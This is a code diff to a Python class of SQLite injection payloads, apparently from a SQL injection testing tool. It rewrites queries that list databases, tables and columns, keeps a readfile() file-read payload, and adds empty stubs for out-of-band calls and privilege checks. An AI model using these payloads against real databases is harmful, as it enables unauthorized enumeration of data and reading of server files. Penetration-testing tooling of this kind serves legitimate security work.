@@ -8,6 +8,7 @@ class SQLitePayloads:
     name = "sqlite"
     comment = "-- "
     inline_comment = "/*!*/"
+    substitution_char = "s"
 
     @staticmethod
     def version() -> List[str]:
@@ -18,22 +19,20 @@ class SQLitePayloads:
     @staticmethod
     def databases() -> List[str]:
         return [
-            "SELECT name FROM pragma_database_list",
-            "SELECT file FROM pragma_database_list",
+            "SELECT group_concat(name, ',') FROM pragma_database_list",
         ]
 
     @staticmethod
     def tables(db: str) -> List[str]:
         return [
-            "SELECT name FROM sqlite_master WHERE type='table'",
-            "SELECT tbl_name FROM sqlite_master WHERE type='table'",
+            "SELECT group_concat(name, ',') FROM sqlite_master WHERE type='table'",
         ]
 
     @staticmethod
     def columns(db: str, table: str) -> List[str]:
         return [
-            f"SELECT sql FROM sqlite_master WHERE tbl_name='{table}' AND type='table'",
-            f"PRAGMA table_info({table})",
+            f"SELECT group_concat(name, ',') FROM pragma_table_info('{table}')",
+            f"SELECT sql FROM sqlite_master WHERE tbl_name='{table}'",
         ]
 
     @staticmethod
@@ -45,14 +44,6 @@ class SQLitePayloads:
 
     @staticmethod
     def current_user() -> List[str]:
-        return ["SELECT ''"]
-
-    @staticmethod
-    def is_admin() -> List[str]:
-        return []
-
-    @staticmethod
-    def privileges() -> List[str]:
         return []
 
     @staticmethod
@@ -76,6 +67,18 @@ class SQLitePayloads:
         return ["SELECT sqlite_version()"]
 
     @staticmethod
+    def is_dba() -> List[str]:
+        return []
+
+    @staticmethod
+    def is_admin() -> List[str]:
+        return []
+
+    @staticmethod
+    def privileges() -> List[str]:
+        return []
+
+    @staticmethod
     def file_read(path: str) -> List[str]:
         return [
             f"SELECT readfile('{path}')",
@@ -90,4 +93,8 @@ class SQLitePayloads:
 
     @staticmethod
     def os_cmd(cmd: str) -> List[str]:
+        return []
+
+    @staticmethod
+    def oob_call(target: str, data: str) -> List[str]:
         return []
